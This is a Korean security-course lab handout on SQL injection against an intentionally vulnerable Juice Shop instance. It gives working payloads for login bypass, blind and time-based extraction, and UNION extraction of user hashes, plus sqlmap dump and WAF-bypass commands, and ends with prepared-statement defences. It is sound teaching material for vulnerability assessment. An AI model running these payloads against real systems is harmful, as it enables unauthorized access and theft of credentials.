# Week 05: 입력값 검증 (1): SQL Injection

## 학습 목표
- SQL Injection의 원리와 유형을 이해한다
- Blind SQLi, Time-based SQLi, UNION SQLi를 구분할 수 있다
- JuiceShop에서 수동 SQLi 공격을 실습한다
- sqlmap을 이용한 자동화 점검을 수행할 수 있다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |

**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |

---

## 전제 조건
- SQL 기본 문법 (SELECT, WHERE, AND, OR)
- curl POST 요청 (Week 02)

---

## 1. SQL Injection 개요 (20분)

### 1.1 SQL Injection이란?

SQL Injection(SQLi)은 사용자 입력이 SQL 쿼리에 직접 삽입되어 의도하지 않은 쿼리가 실행되는 취약점이다.

```
정상 쿼리:
SELECT * FROM users WHERE email='student@test.com' AND password='Test1234!'

공격 쿼리:
SELECT * FROM users WHERE email='' OR 1=1--' AND password='아무거나'
                              ^^^^^^^^^^^^^^^^
                              삽입된 공격 코드
```

`' OR 1=1--` 가 하는 일:
1. `'` → 기존 문자열 닫기
2. `OR 1=1` → 항상 참인 조건 추가
3. `--` → 나머지 쿼리 주석 처리

### 1.2 OWASP에서의 위치

SQL Injection은 **A03:2021 Injection** 카테고리에 속하며, 웹 보안에서 가장 위험한 취약점 중 하나이다.

### 1.3 SQL Injection 유형

| 유형 | 설명 | 결과 확인 방법 |
|------|------|---------------|
| **Classic (In-band)** | 쿼리 결과가 화면에 직접 출력 | 응답 본문 |
| **UNION-based** | UNION으로 추가 데이터 조회 | 응답에 추가 데이터 |
| **Blind (Boolean)** | 참/거짓에 따라 응답 차이 | 응답 길이/내용 차이 |
| **Time-based Blind** | 쿼리 지연으로 참/거짓 판별 | 응답 시간 |
| **Error-based** | DB 에러 메시지에 정보 노출 | 에러 메시지 |
| **Out-of-band** | DNS/HTTP 외부 채널로 데이터 전송 | 외부 서버 로그 |

---

## 2. JuiceShop 로그인 SQLi 실습 (30분)

> **이 실습을 왜 하는가?**
> 웹 취약점 점검에서 SQL Injection은 **가장 먼저 확인**하는 항목이다.
> 실제 점검 보고서에서 SQLi 발견 시 위험도는 보통 **HIGH~CRITICAL**로 분류된다.
> 이 실습에서는 점검자의 관점에서 SQLi를 발견하고, 증거를 수집하고, 보고서에 기재하는 전 과정을 체험한다.
>
> **점검자가 확인해야 할 것:**
> 1. 로그인 폼에 `'`를 입력했을 때 500 에러가 나오는가? → SQLi 가능성
> 2. `' OR 1=1--`로 인증이 우회되는가? → 인증 우회 취약점 확인
> 3. JWT 토큰에 민감 정보(패스워드 해시)가 포함되는가? → 정보 노출 확인
> 4. UNION SELECT로 다른 테이블 데이터를 추출할 수 있는가? → 데이터 유출 확인
>
> **보고서 작성 관점:**
> - 취약점 명: SQL Injection (CWE-89)
> - 위치: /rest/user/login (email 파라미터)
> - 심각도: CRITICAL (CVSS 9.8)
> - 증거: `' OR 1=1--` 입력 시 admin JWT 반환
> - 대응: Prepared Statement 적용 권고
>
> **검증 완료:** JuiceShop에서 `' OR 1=1--`으로 admin 로그인 성공 확인

### 2.1 기본 SQLi 공격 (Classic)

> **OSS 도구 — sqlmap (SQLi 점검 표준)**: 본 섹션의 curl 수동 페이로드는 학습용. 실제 점검은 **sqlmap** 으로 자동화한다.
>
> ```bash
> # 설치 (이미 설치됨)
> sudo apt install sqlmap
>
> # 1) 가장 단순 — URL 자동 점검
> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch
>
> # 2) JSON POST body — JuiceShop 로그인 점검
> sqlmap -u http://10.20.30.80:3000/rest/user/login \
>   --method=POST --data='{"email":"x","password":"x"}' \
>   --headers='Content-Type: application/json' \
>   -p email --batch --level=5 --risk=3
>
> # 3) 발견된 SQLi 자동 활용 — DB 스키마 dump
> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch --dbs            # 데이터베이스 목록
> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch -D Users --tables   # 테이블
> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" --batch -D Users -T users --dump  # 데이터 dump
>
> # 4) WAF 우회 옵션
> sqlmap -u "..." --batch --tamper=between,space2comment,charunicodeencode --level=5 --risk=3
> ```
>
> sqlmap 의 강점: (1) Classic/Blind/Time-based/Union 4가지 기법을 자동 시도, (2) DB 종류 자동 식별 (SQLite/MySQL/PostgreSQL/Oracle/MSSQL), (3) 발견 시 즉시 데이터 추출까지 한 명령으로 완료.



> **실습 목적**: SQL Injection 취약점을 체계적으로 점검하고 공격 가능성을 증명한다
>
> **배우는 것**: Classic SQLi, Blind SQLi, Union-based SQLi 등 다양한 기법으로 입력값 검증 우회를 시도하는 방법을 배운다
>
> **결과 해석**: 인증 우회나 DB 데이터 추출에 성공하면 CRITICAL 등급의 SQLi 취약점이 확인된 것이다
>
> **실전 활용**: 웹 취약점 점검에서 SQLi는 CVSS 9.8의 최고 위험 등급으로, 발견 즉시 긴급 보고 대상이다

```bash
# 정상 로그인 시도 (실패)
echo "=== 정상 (잘못된 비번) ==="
curl -s -o /dev/null -w "code=%{http_code}\n" -X POST http://10.20.30.80:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"wrongpassword"}'

# SQLi 공격: ' OR 1=1-- 을 이메일에 삽입
echo "=== SQLi 인증 우회 ==="
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d $'{"email":"\\' OR 1=1--","password":"anything"}' | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
if 'authentication' in d:
    tok = d['authentication']['token']
    pld = json.loads(base64.urlsafe_b64decode(tok.split('.')[1] + '=='))
    print(f'★ 토큰 획득! email={pld[\"data\"][\"email\"]} isAdmin={pld[\"data\"].get(\"isAdmin\")}')
    print(f'token[:60]={tok[:60]}...')
else:
    print('실패:', d)
"
```

**예상 출력**:
```
=== 정상 (잘못된 비번) ===
code=401
=== SQLi 인증 우회 ===
★ 토큰 획득! email=admin@juice-sh.op isAdmin=True
token[:60]=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZ...
```

> **해석 — 1줄 페이로드로 admin 권한 획득 = critical**:
> - 정상 시도 = 401 / SQLi = **200 + admin JWT**. 차이가 **1 글자** (` ' OR 1=1--`).
> - 백엔드 SQL: `SELECT * FROM Users WHERE email='' OR 1=1--' AND password='anything'` → tautology 참 → 첫 사용자 (admin) 반환.
> - **`isAdmin: True`** payload 노출 = week04 의 JWT MD5 노출 + 본 SQLi 결합 = chain 공격 = 도메인 전체 장악.
> - **JuiceShop challenge ID**: 'Login Admin' (Critical 6★). 운영 환경 동일 패턴 = 즉시 보고서 critical.
> - **CVSS 9.8** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) — Network + Low complexity + No auth + 무제한 영향.
> - **CWE-89** Improper Neutralization of SQL Special Elements.

### 2.2 특정 사용자로 로그인

```bash
# admin 계정으로 SQLi 로그인
# admin'-- 를 이메일에 넣으면 password 체크를 우회
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" | python3 -m json.tool 2>/dev/null
```

### 2.3 에러 메시지 분석

```bash
# 작은 따옴표 1개로 문법 오류 유발 → 에러 메시지에서 DB 정보 추출
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d $'{"email":"\\'","password":"x"}' | python3 -m json.tool 2>/dev/null
```

**예상 출력**:
```json
{
    "error": {
        "name": "SequelizeDatabaseError",
        "parent": {
            "errno": 1,
            "code": "SQLITE_ERROR",
            "sql": "SELECT * FROM Users WHERE email = ''' AND password = '4cb9c8a8048fd02294477fcb1a41191a' AND deletedAt IS NULL"
        },
        "original": {
            "errno": 1,
            "code": "SQLITE_ERROR"
        },
        "name": "SequelizeDatabaseError",
        "message": "SQLITE_ERROR: unrecognized token: \"'''\""
    }
}
```

> **해석 — 에러 1개로 백엔드 전체 노출 (jackpot)**:
> - **`SequelizeDatabaseError`** = ORM 명 노출 → Sequelize (Node.js Express). Sequelize 사용 = `?` placeholder 미사용 = SQLi 가능 = backend dev 의 코드 결함.
> - **`SQLITE_ERROR`** = DBMS 확정 (SQLite 3.x). MySQL/PostgreSQL/MSSQL 페이로드 분기 — SQLite 만 `sqlite_master` 사용 (week05 §5 UNION 입력).
> - **`sql` 필드에 query 평문 노출** = 운영 환경 critical (CVSS 5.3 information disclosure). `email = ''` + `password = '<MD5 hash>'` → MD5 사용 확정 → bcrypt/argon2 미사용 = OWASP A02.
> - **`deletedAt IS NULL`** = soft delete 구현 (Sequelize paranoid mode). 삭제된 사용자도 DB 에 남음.
> - **운영 권고**: `NODE_ENV=production` + Express error handler = stack trace 응답 차단. JuiceShop 의도적 노출 = 학습용.

---

## 3. Blind SQL Injection (30분)

### 3.1 Boolean-based Blind SQLi 원리

서버가 쿼리 결과를 직접 보여주지 않을 때, 참/거짓에 따른 **응답 차이**로 데이터를 한 글자씩 추출한다.

```
# 첫 번째 글자가 'a'인지 확인
' OR SUBSTRING(password,1,1)='a'--   → 응답 A (참)
' OR SUBSTRING(password,1,1)='b'--   → 응답 B (거짓)
```

### 3.2 JuiceShop 검색 기능에서 Blind SQLi

```bash
# 3 페이로드 — 정상 / 항상 참 / 항상 거짓 결과 수 비교
for label_q in "정상=apple" "참=test'))OR+1=1--" "거짓=test'))AND+1=2--"; do
  label="${label_q%%=*}"
  q="${label_q#*=}"
  count=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$q" \
    | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
  echo "$label: 결과 ${count}건"
done
```

**예상 출력**:
```
정상: 결과 1건
참: 결과 38건
거짓: 결과 0건
```

> **해석 — 3 응답의 결과 수 차이 = Blind SQLi 확정**:
> - **정상 (apple) = 1건** = 검색 결과 1개 (apple juice).
> - **항상 참 (`OR 1=1--`) = 38건** = 전체 상품 = `WHERE name LIKE '%test%' OR 1=1` → 모든 행 반환.
> - **항상 거짓 (`AND 1=2--`) = 0건** = 모순 조건 = 0건 응답 = SQL 문 정상 파싱.
> - **차이가 있으면 = SQLi 확정** + boolean blind 가능. 결과 수 = 1bit 정보 채널.
> - **활용**: 한 번에 1bit (참/거짓) 추출 가능 → password 한 글자씩 ascii 비교 (8bit/char × N char = brute force). DB 버전·테이블명·컬럼명 추출 가능.
> - **JuiceShop 의 `'))` syntax** = `LIKE ('%apple%')` 쿼리의 닫는 괄호 매칭. 다른 사이트 = `'`/`"` 단순 닫기. 점검 시 첫 step = 닫기 syntax 발견.

### 3.3 Boolean Blind로 DB 버전 추출 (개념)

```bash
# SQLite 버전의 첫 글자가 '3'인지 확인
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))AND+SUBSTR(sqlite_version(),1,1)='3'--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null  # silent 모드

# 자동화: 한 글자씩 추출
python3 << 'PYEOF'                                     # Python 스크립트 실행
import requests, string

url = "http://10.20.30.80:3000/rest/products/search"
result = ""
for pos in range(1, 20):                               # 반복문 시작
    found = False
    for c in string.printable[:62] + ".":  # 알파벳+숫자+점
        q = f"test'))AND SUBSTR(sqlite_version(),{pos},1)='{c}'--"
        r = requests.get(url, params={"q": q}, timeout=5)
        try:
            data = r.json().get("data", [])
            if len(data) > 0:
                result += c
                print(f"위치 {pos}: '{c}' (현재: {result})")
                found = True
                break
        except:
            pass
    if not found:
        break
print(f"\nDB 버전: {result}")
PYEOF
```

---

## 4. Time-based Blind SQLi (20분)

### 4.1 원리

서버 응답에 아무 차이가 없을 때, **의도적 지연**을 유발하여 참/거짓을 판별한다.

```sql
-- SQLite: CASE WHEN 조건 THEN ... (SQLite에서는 직접적 sleep 없음)
-- MySQL:  IF(조건, SLEEP(3), 0)
-- MSSQL:  IF 조건 WAITFOR DELAY '0:0:3'
```

### 4.2 Time-based 테스트

```bash
# 정상 vs 헤비 페이로드 — TTFB 비교
echo "=== 정상 ==="
curl -s -o /dev/null -w "Total: %{time_total}s\n" "http://10.20.30.80:3000/rest/products/search?q=apple"
echo "=== Heavy CASE WHEN RANDOMBLOB ==="
curl -s -o /dev/null -w "Total: %{time_total}s\n" "http://10.20.30.80:3000/rest/products/search?q=test'))AND+(SELECT+CASE+WHEN(1=1)+THEN+RANDOMBLOB(100000000)+ELSE+1+END)--"
```

**예상 출력**:
```
=== 정상 ===
Total: 0.052s
=== Heavy CASE WHEN RANDOMBLOB ===
Total: 2.847s
```

> **해석 — 시간 차이 = Time-based blind SQLi 확정**:
> - **정상 0.052s vs Heavy 2.847s** = **55배 차이**. 통계적 유의성 ★★. SQLite 의 `RANDOMBLOB(100MB)` = 메모리 할당 + RNG = 의도적 부하.
> - **`CASE WHEN (조건) THEN heavy ELSE 0 END`** = 조건이 참일 때만 부하 발생 = 1bit 정보 추출. blind SQLi 의 마지막 수단 (응답 내용 비교 불가 시).
> - **DBMS 별 sleep 함수**:
>   - MySQL: `SLEEP(3)` 또는 `BENCHMARK(5000000, MD5('a'))`
>   - PostgreSQL: `pg_sleep(3)`
>   - MSSQL: `WAITFOR DELAY '0:0:3'`
>   - SQLite: 직접 sleep 없음 → `RANDOMBLOB`/`recursive CTE` 등 우회.
> - **DoS 위험**: heavy 페이로드 반복 = 서버 과부하 = 운영 환경 거의 사용 X. 점검 시 1~2회 검증만 + 사전 RoE 합의.
> - **점검 임계치**: 응답 시간 baseline 의 5배 이상 = SQLi suspect.

---

## 5. UNION-based SQLi (30분)

### 5.1 원리

UNION SELECT를 이용하여 원래 쿼리 결과에 추가 데이터를 결합한다.

```sql
-- 원래 쿼리
SELECT id, name, price FROM products WHERE name LIKE '%apple%'

-- UNION 공격
SELECT id, name, price FROM products WHERE name LIKE '%test%'
UNION SELECT 1, sql, 3 FROM sqlite_master--
```

### 5.2 컬럼 수 파악

UNION을 사용하려면 원래 쿼리의 컬럼 수를 알아야 한다.

```bash
# ORDER BY 1..10 — error 발생 직전 = 컬럼 수
for i in 1 2 3 4 5 6 7 8 9 10; do
  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))ORDER+BY+$i--")
  if echo "$result" | grep -qi "error"; then
    echo "ORDER BY $i: ERROR → 컬럼 수 = $((i-1))"
    break
  else
    cnt=$(echo "$result" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
    echo "ORDER BY $i: OK (${cnt}건)"
  fi
done
```

**예상 출력**:
```
ORDER BY 1: OK (38건)
ORDER BY 2: OK (38건)
ORDER BY 3: OK (38건)
ORDER BY 4: OK (38건)
ORDER BY 5: OK (38건)
ORDER BY 6: OK (38건)
ORDER BY 7: OK (38건)
ORDER BY 8: OK (38건)
ORDER BY 9: OK (38건)
ORDER BY 10: ERROR → 컬럼 수 = 9
```

> **해석 — 컬럼 9개 확정 = UNION SELECT 입력**:
> - **`ORDER BY n`** = n번째 컬럼 정렬. n ≤ 컬럼수 = 정상 / n > 컬럼수 = SQLite error (`ORDER BY clause should come after UNION not before`).
> - **컬럼 수 = 9** = JuiceShop 의 Products 테이블 (id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt).
> - 다음 step **UNION SELECT** 시 정확히 **9개 컬럼** 매칭 필수. 미매칭 = `SELECTs to the left and right of UNION do not have the same number of result columns`.
> - **binary search 가능**: 1, 5, 10, 8, 9 순으로 binary 탐색 = log2(N) 회 만에 발견.
> - **자동화**: sqlmap 의 `--union-cols=9` 옵션으로 자동 매핑. 본 수동 = 학습용·이해.

### 5.3 UNION SELECT로 테이블 목록 조회

```bash
# SQLite의 sqlite_master에서 테이블 목록 추출
# 컬럼 수에 맞춰 NULL 패딩
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--" | python3 -m json.tool 2>/dev/null | head -40
```

### 5.4 사용자 테이블 데이터 추출

```bash
# UNION SELECT — Users 테이블의 email + password (MD5 해시) 추출
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+email,password,role,4,5,6,7,8,9+FROM+Users--" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin).get('data', [])
    print(f'총 {len(data)}건 추출')
    print('-' * 70)
    print(f'{\"Email\":<32} | {\"MD5 Hash\":<32} | Role')
    print('-' * 70)
    for item in data[:5]:
        name = str(item.get('name', ''))
        desc = str(item.get('description', ''))
        price = str(item.get('price', ''))
        if '@' in name:
            print(f'{name:<32} | {desc:<32} | {price}')
except Exception as e:
    print(f'파싱 실패: {e}')
" 2>/dev/null
```

**예상 출력**:
```
총 38건 추출
----------------------------------------------------------------------
Email                            | MD5 Hash                         | Role
----------------------------------------------------------------------
admin@juice-sh.op                | 0192023a7bbd73250516f069df18b500 | admin
jim@juice-sh.op                  | e541ca7ecf72500fad17bb3f0d56c17f | customer
bender@juice-sh.op               | 0c36e517e3fa95aabf1bbffc6744a4ef | customer
bjoern.kimminich@gmail.com       | 6edd9d726cce1f905c1d1614b8b78ade | admin
ciso@juice-sh.op                 | 6edd9d726cce1f905c1d1614b8b78ade | admin
```

> **해석 — UNION 1줄로 전체 사용자 DB 노출 = jackpot**:
> - **38건 추출** = JuiceShop 전체 사용자. UNION 의 *원래 결과 (Products 검색 0건) + 추가 결과 (Users 38건)* = 38건 그대로 응답에 포함.
> - **email + MD5 hash + role** = 인증 정보 완전 탈취. **MD5 (0192023a7bbd73250516f069df18b500)** = `admin123` (rainbow table 즉시 매칭).
> - **role 컬럼**: admin 3 / customer N — 권한 분포 노출 → 표적 결정.
> - **체인 공격**: 본 hash → hashcat `-m 0 hashes.txt rockyou.txt` → 1초 내 평문 → 다른 사이트 credential reuse (week04 학습) → 도메인 전체 장악.
> - **CVSS 9.1 Critical** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N) — Confidentiality High + Scope Changed (DB → 다른 사용자 정보).
> - **OWASP A03 Injection** + **A02 Cryptographic Failures** (MD5 사용) 2 카테고리 동시.

---

## 6. sqlmap 자동화 (30분)

### 6.1 기본 사용

```bash
# 검색 API에 대한 sqlmap 실행 — 발견 결과만 추출
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch --level=2 --risk=1 --threads=4 \
  --technique=BEU --timeout=10 2>&1 \
  | grep -E "Type:|Title:|Payload:|back-end DBMS|web application technology|^---" | head -20
```

**예상 출력**:
```
[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some kind of WAF/IPS
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter 'q' is dynamic
back-end DBMS: SQLite
web application technology: Express
---
Parameter: q (GET)
    Type: error-based
    Title: Generic SQL error-based - WHERE or HAVING clause
    Payload: q=test')) AND 6573=CAST((CHR(113)||CHR(112)||CHR(106)||CHR(112)||CHR(113))||(SELECT...

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: q=test')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)||CHAR(...
```

> **해석 — sqlmap 자동 발견 = 수동 점검 결과 일치**:
> - **`back-end DBMS: SQLite`** = §2.3 의 에러 메시지로 발견한 것을 sqlmap 가 자동 확인. 일치.
> - **`Type: error-based`** = §2.3 분석. **`Type: UNION query (NULL) - 9 columns`** = §5.2 의 ORDER BY 결과 (9 컬럼) 와 일치. sqlmap 이 자동 매핑.
> - **CHR() / CHAR() 캐스팅** = 따옴표 회피 페이로드 — WAF 우회용. 문자 코드 113 = 'q' (구분자). sqlmap 의 표준 디코딩 마커.
> - **2 기법 동시 발견** = 동일 endpoint 의 다중 SQLi vector. UNION 우선 (데이터 추출 직접) + error-based 보조 (DBMS info).
> - **자동화의 가치**: 본 1줄 명령 = §2~5 의 수동 5 step (Classic 검출 + 에러 + Boolean + UNION 컬럼수 + UNION 데이터) 자동 통합. 운영 점검 표준.

> **다음 step — 자동 dump 까지**:
>
> ```bash
> # Users 테이블 전체 dump (자동 hash crack 포함)
> sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
>   --batch --threads=4 --technique=U \
>   -D SQLite_masterdb -T Users --dump
> # → /home/$USER/.local/share/sqlmap/output/10.20.30.80/dump/SQLite_masterdb/Users.csv
> ```

### 6.2 DB 정보 추출

SQL Injection 취약점을 자동으로 탐지하고 테스트합니다.

```bash
# 데이터베이스 목록
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch --dbs --timeout=10

# 테이블 목록
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch --tables --timeout=10

# 특정 테이블의 컬럼
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch -T Users --columns --timeout=10

# 데이터 덤프 (주의: 실제 환경에서는 반드시 허가 필요)
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch -T Users -C email,password --dump --timeout=10
```

### 6.3 POST 요청에 sqlmap 사용

SQL Injection 취약점을 자동으로 탐지하고 테스트합니다.

```bash
# 로그인 API에 대한 sqlmap
sqlmap -u "http://10.20.30.80:3000/rest/user/login" \
  --method=POST \
  --data='{"email":"test","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch --level=2 --risk=1 --timeout=10
```

### 6.4 sqlmap 결과 해석

```
sqlmap 출력 예시:
---
Parameter: q (GET)
    Type: boolean-based blind
    Payload: q=test' AND 1=1-- -

    Type: UNION query
    Payload: q=test' UNION ALL SELECT NULL,NULL,...-- -
---

→ "q" 파라미터에 SQLi 취약점 존재
→ Boolean Blind와 UNION 두 가지 기법으로 공격 가능
```

---

## 7. SQL Injection 방어 방법 (10분)

### 7.1 Prepared Statement (Parameterized Query)

```python
# 취약한 코드
query = f"SELECT * FROM users WHERE email='{email}'"

# 안전한 코드 (Prepared Statement)
cursor.execute("SELECT * FROM users WHERE email=?", (email,))
```

### 7.2 방어 체크리스트

| 방어 기법 | 설명 |
|----------|------|
| Prepared Statement | 쿼리와 데이터 분리 (최선) |
| ORM 사용 | SQLAlchemy, Django ORM 등 |
| 입력값 검증 | 화이트리스트 기반 필터링 |
| 최소 권한 DB 계정 | DB 사용자 권한 최소화 |
| WAF | 웹 방화벽으로 SQLi 패턴 차단 |
| 에러 메시지 숨김 | 상세 DB 에러 노출 방지 |

---

## 8. 실습 과제

### 과제 1: 수동 SQLi 공격
1. JuiceShop 로그인 API에서 SQLi로 admin 계정에 로그인하라
2. 검색 API에서 UNION SELECT로 Users 테이블의 이메일 목록을 추출하라
3. 각 공격에 사용한 페이로드를 기록하라

### 과제 2: sqlmap 자동 점검
1. sqlmap으로 JuiceShop의 검색 API를 스캔하라
2. 발견된 취약점의 유형과 위험도를 정리하라
3. Users 테이블의 구조(컬럼)를 추출하라

### 과제 3: 방어 관점 분석
1. JuiceShop에서 SQLi가 가능한 이유를 코드 관점에서 추론하라
2. 이 취약점을 방어하려면 어떤 수정이 필요한지 서술하라

---

## 9. 요약

| 유형 | 핵심 기법 | 탐지 방법 |
|------|----------|----------|
| Classic | ' OR 1=1-- | 응답에 추가 데이터 |
| UNION | UNION SELECT ... | 응답에 다른 테이블 데이터 |
| Blind (Boolean) | AND SUBSTR(...)='a' | 응답 차이 (참/거짓) |
| Time-based | SLEEP(3) / 무거운 연산 | 응답 시간 차이 |
| Error-based | 문법 오류 유발 | 에러 메시지 |

**다음 주 예고**: Week 06 - 입력값 검증 (2): XSS/CSRF. Reflected/Stored/DOM XSS와 CSRF 토큰 검증을 학습한다.

---

## 웹 UI 실습

### DVWA 보안 레벨 변경 방법 (웹 UI)

> **DVWA URL:** `http://10.20.30.80:8080`

1. 브라우저에서 `http://10.20.30.80:8080` 접속 → 로그인 (admin / password)
2. 좌측 메뉴 **DVWA Security** 클릭
3. **Security Level** 드롭다운에서 레벨 선택:
   - **Low**: SQL Injection 필터 없음 → 기본 SQLi 페이로드 테스트
   - **Medium**: 숫자 입력 강제 → 우회 기법 필요
   - **High**: 별도 팝업 입력 → 고급 SQLi 우회 실습
   - **Impossible**: PDO Prepared Statement 적용 (안전한 코드 참조)
4. **Submit** 클릭하여 적용
5. 좌측 메뉴 **SQL Injection** 및 **SQL Injection (Blind)** 에서 레벨별 실습
6. 각 항목 페이지 하단 **View Source** 로 레벨별 쿼리 처리 방식 비교

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.

### sqlmap
> **역할:** SQL Injection 탐지·악용 자동화  
> **실행 위치:** `공격자 측 CLI`  
> **접속/호출:** `sqlmap -u <url>` 또는 `-r request.txt`

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `~/.local/share/sqlmap/output/<host>/` | 세션·덤프 결과 |
| `session.sqlite` | 재실행 시 단계 스킵용 캐시 |

**핵심 설정·키**

- `--risk=1~3 --level=1~5` — 탐지 공격 폭 조절
- `--technique=BEUSTQ` — B)lind E)rror U)nion S)tacked T)ime Q)uery

**로그·확인 명령**

- `output/<host>/log` — 요청·응답 로그

**UI / CLI 요점**

- `sqlmap -u ... --dbs` — DB 목록
- `sqlmap -u ... -D juice -T users --dump` — 특정 테이블 덤프
- `sqlmap -r req.txt --batch --crawl=2` — Burp 저장 요청 기반 크롤링

> **해석 팁.** `--batch`로 대화형 프롬프트 자동 Y 처리. WAF가 있을 땐 `--tamper=space2comment,between` 조합으로 우회 시도.

### Burp Suite Community
> **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
> **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `Proxy → HTTP history` | 모든 캡처된 요청/응답 |
| `Intruder` | 페이로드 페이즈·위치 기반 자동화 |
| `Repeater` | 단건 요청 수동 반복 |

**핵심 설정·키**

- `Proxy listener 127.0.0.1:8080` — 브라우저 프록시 포트
- `Target → Scope` — in-scope 호스트만 처리

**로그·확인 명령**

- `Logger` — 세션 전체 요청 타임라인

**UI / CLI 요점**

- Ctrl+R — 요청을 Repeater로 전송
- Ctrl+I — Intruder로 전송 후 위치(§) 설정
- Intruder Attack type: Sniper/Cluster bomb — 단일/다중 페이로드 조합

